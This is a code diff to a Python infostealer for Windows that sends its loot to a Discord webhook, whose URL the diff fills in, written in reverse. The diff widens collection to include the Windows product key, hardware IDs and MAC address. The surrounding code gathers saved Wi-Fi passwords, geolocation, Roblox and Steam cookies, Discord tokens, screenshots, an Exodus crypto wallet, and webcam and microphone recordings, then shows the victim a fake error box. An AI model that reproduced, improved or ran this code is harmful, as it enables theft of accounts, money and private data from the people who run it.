@@ -17,7 +17,7 @@ import zipfile
 import base64
 import sqlite3
 import win32crypt
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 import shutil
 from datetime import datetime, timedelta
 from PIL import ImageGrab
@@ -31,8 +31,7 @@ import ctypes
 import winreg as wrg
 
 
-
-webhookurl='webhook'
+webhookurl='20ZhsVnlQujHalXYXB0YwnGCIC2FQqyfDeMLmvWznz_FeELKo3-5xoVCJa_3mlqSGq5O/1663699614204991311/skoohbew/ipa/moc.drocsid//:sptth'
 userhome = os.path.expanduser('~')
 folderdir=os.path.join(userhome,'Data')
 startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -235,18 +234,76 @@ firefox_steam_cookie, firefox_session_cookie = firefox_steam()
 opera_steam_cookie, opera_session_cookie = opera_steam()
 
 def sysinfo():
-    info={}
-    info['Hostname']=socket.gethostname()
-    info['Processor']=platform.processor()
-    info['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
-    info['Machine']=platform.machine()
-    info['Architecture']=platform.architecture()
-    info['OS']=platform.system()
-    info['OS-release']=platform.release()
-    info['OS-version']=platform.version()
-    info['Mac-Address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
-    return json.dumps(info)
-info=json.loads(sysinfo())
+    location = wrg.HKEY_LOCAL_MACHINE
+
+    # Define the registry paths
+    GPUpath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinSAT"
+    CPUpath = r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"
+    CpuCorepath = r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
+    Motherboardpath = r"HARDWARE\DESCRIPTION\System\BIOS"
+    OSpath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+    productkeypath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
+    biosverpath = r"HARDWARE\DESCRIPTION\System"
+
+
+    try:
+        soft1 = wrg.OpenKeyEx(location, GPUpath)
+        soft2 = wrg.OpenKeyEx(location, CPUpath)
+        soft3 = wrg.OpenKeyEx(location, Motherboardpath)
+        soft4 = wrg.OpenKeyEx(location, OSpath)
+        soft5 = wrg.OpenKeyEx(location, biosverpath)
+        soft6 = wrg.OpenKeyEx(location, productkeypath)
+        soft7 = wrg.OpenKeyEx(location, CpuCorepath)
+
+        GPU = wrg.QueryValueEx(soft1, "PrimaryAdapterString")
+        CPU = wrg.QueryValueEx(soft2, "ProcessorNameString")
+        RAM = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
+        Cpucorecount = wrg.QueryValueEx(soft7, "NUMBER_OF_PROCESSORS")
+        CpuArchitecture = wrg.QueryValueEx(soft7, "PROCESSOR_ARCHITECTURE")
+        Motherboard = wrg.QueryValueEx(soft3, "BaseBoardProduct")
+        MotherboardProdname = wrg.QueryValueEx(soft3, "SystemProductName")
+        OSversion = wrg.QueryValueEx(soft4, "ProductName")
+        OSbuild = wrg.QueryValueEx(soft4, "CurrentBuildNumber")
+        OSproductID = wrg.QueryValueEx(soft4, "ProductId")
+        ProductKey= wrg.QueryValueEx(soft6, "BackupProductKeyDefault") 
+        bios = wrg.QueryValueEx(soft5, "SystemBiosVersion")
+        MacAddress=':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        hostname=socket.gethostname()
+
+        wrg.CloseKey(soft1)
+        wrg.CloseKey(soft2)
+        wrg.CloseKey(soft3)
+        wrg.CloseKey(soft4)
+        wrg.CloseKey(soft5)
+
+        # Convert the bios value to a string and replace commas with spaces
+        
+        bios_str = " ".join(bios[0]).replace(',', ' ')
+
+        return CPU[0],Cpucorecount[0],CpuArchitecture[0], GPU[0], RAM, Motherboard[0], MotherboardProdname[0], OSversion[0], OSbuild[0],OSproductID[0],ProductKey[0] ,bios_str , MacAddress, hostname
+    except FileNotFoundError:
+        print("The specified path is not found in the Windows Registry.")
+        return None
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        return None
+info =sysinfo()
+CPU, CPUCores, CPUarchitecture, GPU, RAM,Motherboard, MotherboardProd, OSversion, OSbuild, ProductID, ProductKey, bios ,MacAddress, hostname= info
+sysinfodata = {
+    "CPU": CPU,
+    "CPU cores": CPUCores,
+    "CPU Architecture": CPUarchitecture,
+    "RAM": RAM,
+    "GPU": GPU,
+    "Motherboard": Motherboard,
+    "Motherboard Product Name": MotherboardProd,
+    "OS Version": OSversion,
+    "OS Build": OSbuild,
+    "OS ProductID": ProductID,
+    "OS Product Key": ProductKey,
+    "Bios version": bios,
+    "Mac address": MacAddress
+}
 
 def history():
     history = get_history()
@@ -772,55 +829,39 @@ def discordinfo():
         pass        
     
 
-def windowsproductkey():
-    # Store location of HKEY_LOCAL_MACHINE
-    location = wrg.HKEY_LOCAL_MACHINE
 
-    # Define the registry path
-    registry_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
-
-    try:
-        # Open the registry key
-        soft = wrg.OpenKeyEx(location, registry_path)
-
-        # Reading values
-        key = wrg.QueryValueEx(soft, "BackupProductKeyDefault")
-
-        # Close the registry key
-        wrg.CloseKey(soft)
-
-        # Printing values
-        return key[0]
-
-    except FileNotFoundError:
-        print(f"The specified path '{registry_path}' is not found in the Windows Registry.")
-        return None
-    except Exception as e:
-        print(f"An error occurred: {e}")
-        return None
-def CPU_GPU_values():
     location = wrg.HKEY_LOCAL_MACHINE
 
     # Define the registry paths
     GPUpath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinSAT"
     CPUpath = r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"
+    Motherboardpath= r"HARDWARE\DESCRIPTION\System\BIOS"
+    OSpath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+    OSbuildpath =r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
 
     try:
         soft1 = wrg.OpenKeyEx(location, GPUpath)
         soft2 = wrg.OpenKeyEx(location, CPUpath)
+        soft3 = wrg.OpenKeyEx(location, Motherboardpath)
+        soft4 = wrg.OpenKeyEx(location, OSpath)
 
         GPU = wrg.QueryValueEx(soft1, "PrimaryAdapterString")
         CPU = wrg.QueryValueEx(soft2, "ProcessorNameString")
+        Motherboard = wrg.QueryValueEx(soft3, "BaseBoardProduct")
+        OSversion= wrg.QueryValueEx(soft4, "ProductName")
+        OSbuild = wrg.QueryValueEx(soft4, "CurrentBuildNumber")
 
         wrg.CloseKey(soft1)
         wrg.CloseKey(soft2)
+        wrg.CloseKey(soft3)
         
-        return CPU[0], GPU[0]
+        return CPU[0], GPU[0], Motherboard[0], OSversion[0], OSbuild[0]
 
     except FileNotFoundError:
         print("The specified path is not found in the Windows Registry.")
     except Exception as e:
-        print(f"An error occurred: {e}") 
+        print(f"An error occurred: {e}")    
+
 
 
     
@@ -831,12 +872,12 @@ webcamthread=threading.Thread(target=webcam)
 micthread=threading.Thread(target=record_audio)
 
 wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
-geolocationembed=DiscordEmbed(title='Geolocation Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
+geolocationembed=DiscordEmbed(title='IP and Geolocation Data',description=f'```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
 robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
-sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Windows Product Key: {windowsproductkey()}```\n```CPU: {CPU_GPU_values()[0]}```\n```GPU: {CPU_GPU_values()[1]}```\n```Ram: {info["RAM"]}```\n```CPU Architecture: {info["Machine"]}```\n```Windows Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
+sysembed=DiscordEmbed(title='System Information',description=f'### System Info:',color='ab222b')
 steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
 steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
-discordtokenembed= DiscordEmbed(title='Discord Token(s)',description='# Tokens:\n')
+discordtokenembed= DiscordEmbed(title='Discord Token(s)',description='### Tokens:\n')
 discordtokeninfoembed= DiscordEmbed()
 
 
@@ -864,6 +905,10 @@ for token in Discordtokens():
     if tokenamt == tokenlistamt:
         break
 
+for key, value in sysinfodata.items():
+    value = f'```{value}```'
+    sysembed.add_embed_field(name=key, value=value)
+
 webhook.add_embed(sysembed) 
 webhook.add_embed(wifiembed)
 webhook.add_embed(geolocationembed)
@@ -872,13 +917,13 @@ webhook.add_embed(steamloginembed)
 webhook.add_embed(steamsesembed)
 webhook.add_embed(discordtokenembed)
 
-screenie()#screenshots the users screen  
+screenie()#screenshots the users screen(s)  
 exo()#get exodus cryptowallet Appdata and adds the zip to webhook
  
 webcamthread.join()
 micthread.join()
 
-remove_all_zip_files(os.path.dirname(sys.executable))    
+remove_all_zip_files(os.path.dirname(sys.executable)) 
 webhook.execute()
 ctypes.windll.user32.MessageBoxW(0, "Error 99: Please try again later", "An error as occured", 1)
 #if not os.path.realpath(sys.executable) == startup_script_path:
